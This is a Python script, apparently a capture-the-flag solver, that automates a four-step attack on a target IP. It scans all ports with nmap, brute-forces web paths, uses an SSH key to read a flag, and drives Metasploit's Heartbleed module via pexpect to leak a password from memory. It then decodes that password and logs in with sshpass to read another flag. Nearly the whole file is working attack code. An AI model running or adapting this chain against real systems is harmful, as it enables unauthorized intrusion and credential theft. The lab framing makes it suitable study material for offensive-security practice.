import sys
import nmap
import requests
import re
import subprocess
import pexpect
import re
import base64

# Flag-1

def scan_ports(target):
    scanner = nmap.PortScanner()
    scanner.scan(target, arguments='-p-')

    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            ports = scanner[host][proto].keys()
            for port in ports:
                state = scanner[host][proto][port]['state']
                if state == 'open':
                    port_found, flag_found = find_flag(host, port)
                    if flag_found:
                        return port_found

def find_flag(host, port):
    # HTTP GET request to the specified IP address and port
    url = f"http://{host}:{port}/"

    try:
        response = requests.get(url, timeout=5)
        flag_match = re.search(r'flag1\{.*?\}', response.text)
        if flag_match:
            print(f"Flag-1 found at {url} \n{flag_match.group(0)}")
            return port, True
        
    except requests.exceptions.RequestException as e:
        pass
    
    return None, False

# Flag-2

def find_flag_2(target_ip, port):
    wordlist = "words.txt"

    with open(wordlist, 'r') as F:
        paths = F.read().splitlines()

        for path in paths:

            link = f"http://{target_ip}:{port}/{path}"

            try:
                resp = requests.get(link)
                if resp.status_code == 200:
                    flag_match = re.search(r'flag2\{.*?\}', resp.text)
                    if flag_match:
                        print(f"Flag-2 found at {link} \n{flag_match.group(0)}")
                        break  # Exit the loop after finding the flag

            except requests.exceptions.RequestException as error:
                pass

# Flag-3

def find_flag_3(target_ip):
    key_filename = "flag3key.pem"
    username = "ns"
    hostname = target_ip
    command = "cat flag3.txt"

    ssh_command = [
            "ssh",
            "-i",
            key_filename,
            f"{username}@{hostname}",
            command
        ]

    # Run the ssh command
    result = subprocess.run(ssh_command, capture_output=True, text=True)

    # Check if the command was successful
    if result.returncode == 0:
        output = result.stdout

    else:
        output = result.stderr
        
    print(f"Flag-3 found from the assigned VM \n{output}")


# Flag-4

def find_target_port(target_ip):
    scanner = nmap.PortScanner()
    scanner.scan(target_ip, arguments='-p-')

    for host in scanner.all_hosts():
        for proto in scanner[host].all_protocols():
            ports = scanner[host][proto].keys()
            for port in ports:
                state = scanner[host][proto][port]['state']
                if state == 'open':
                    # HTTP GET request to the specified IP address and port
                    url = f"http://{host}:{port}/"
                    try:
                        response = requests.get(url, timeout=5)
                        if response.status_code == 400:
                            print(f"Port {port} on {host} returned a 400 response - Vulnerability detected!")
                            return port
                    except requests.exceptions.RequestException as e:
                        pass
    return None

def run_metasploit_commands(target_ip, target_port, output_file):
    try:
        # Start msfconsole with logging enabled
        with open(output_file, "w") as f:
            msfconsole = pexpect.spawn("msfconsole", encoding="utf-8", logfile=f)

            # Wait for msfconsole to start
            msfconsole.expect_exact("[?1034h[4mmsf6[0m [0m> ")

            # Send commands to msfconsole
            msfconsole.sendline("use auxiliary/scanner/ssl/openssl_heartbleed")
            msfconsole.expect_exact("[0m[4mmsf6[0m auxiliary([1m[31mscanner/ssl/openssl_heartbleed[0m) [0m> ")

            msfconsole.sendline(f"set RHOST {target_ip}")
            msfconsole.expect_exact("[4mmsf6[0m auxiliary([1m[31mscanner/ssl/openssl_heartbleed[0m) [0m> ")

            msfconsole.sendline(f"set RPORT {target_port}")
            msfconsole.expect_exact("[4mmsf6[0m auxiliary([1m[31mscanner/ssl/openssl_heartbleed[0m) [0m> ")

            msfconsole.sendline("set VERBOSE true")
            msfconsole.expect_exact("[4mmsf6[0m auxiliary([1m[31mscanner/ssl/openssl_heartbleed[0m) [0m> ")

            msfconsole.sendline("run")
            
            # Wait for the command to finish
            msfconsole.expect_exact("[4mmsf6[0m auxiliary([1m[31mscanner/ssl/openssl_heartbleed[0m) [0m> ")

            # Close msfconsole
            msfconsole.sendline("exit")

        # Read the output from the file
        with open(output_file, "r") as f:
            output = f.read()

        # Regular expression pattern to find the password in the output
        password_pattern = r"password=([A-Za-z0-9+/=]+)"

        # Search for the password pattern in the output
        password_match = re.search(password_pattern, output)

        if password_match:
            # Extract the Base64-encoded password
            encoded_password = password_match.group(1)

            # Decode the Base64-encoded password twice
            decoded_password_once = base64.b64decode(encoded_password).decode("utf-8")
            decoded_password_twice = base64.b64decode(decoded_password_once).decode("utf-8")

            print("Decoded Password from Base64-encoded format after Heartbleed attack :", decoded_password_twice)
        else:
            print("Password not found in the output.")

        return decoded_password_twice    

    except pexpect.exceptions.ExceptionPexpect:
        print("Error running Metasploit commands.")
        return None
    
def find_flag_4(target_ip, username, password):
    try:
        # Command to run SSH with username, IP, and password provided by sshpass
        ssh_command = f'sshpass -p "{password}" ssh {username}@{target_ip} "cd home/ns && cat flag4.txt"'

        # Use subprocess.run() to execute the SSH command
        result = subprocess.run(ssh_command, shell=True, capture_output=True, text=True, check=True)

        # Print the output
        print("Flag-4 found in the home/ns directory")
        print(result.stdout)

    except subprocess.CalledProcessError as e:
        print(f"Error executing SSH command: {e}")


if len(sys.argv) != 2:
    print("Usage: python script.py <target_ip>")
    sys.exit(1)


# Flow starts here!

username = "hacker"
target_ip = sys.argv[1]
output_file = "output.txt"

#Flag-1
port = scan_ports(target_ip)
#Flag-2
find_flag_2(target_ip, port)
# Changing permission
subprocess.run(["chmod", "600", "flag3key.pem"])
#Flag-3
find_flag_3(target_ip)
#Flag-4
target_port = find_target_port(target_ip)
output = run_metasploit_commands(target_ip,target_port,output_file)
find_flag_4(target_ip,username,output)
